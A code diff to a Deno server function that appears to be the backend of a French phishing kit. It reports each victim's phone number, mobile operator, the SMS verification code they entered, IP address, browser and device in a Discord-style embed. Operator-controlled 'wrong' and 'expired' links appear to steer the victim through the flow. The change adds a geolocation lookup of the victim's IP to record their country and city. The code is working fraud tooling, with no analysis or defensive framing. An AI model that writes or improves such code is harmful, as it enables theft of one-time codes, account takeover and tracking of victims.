@@ -39,6 +39,15 @@ Deno.serve(async (req) => {
   const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
 
+  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
+  let geoData = { country_name: "France", city: "Inconnue" };
+  if (geoResponse?.ok) {
+    geoData = await geoResponse.json();
+  }
+
+  const country = geoData.country_name || "France";
+  const city = geoData.city || "Inconnue";
+
   const embed = {
     title: "🔑 Code SMS entré",
     color: operatorColors[operateur] || 16776960,
@@ -47,7 +56,8 @@ Deno.serve(async (req) => {
       { name: "📡 Opérateur", value: operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🔢 Code entré", value: `**${code}**`, inline: true },
-      { name: "🌍 Pays", value: "France", inline: true },
+      { name: "🌍 Pays", value: country, inline: true },
+      { name: "🏙️ Ville", value: city, inline: true },
       { name: "🌐 Navigateur", value: browser, inline: true },
       { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
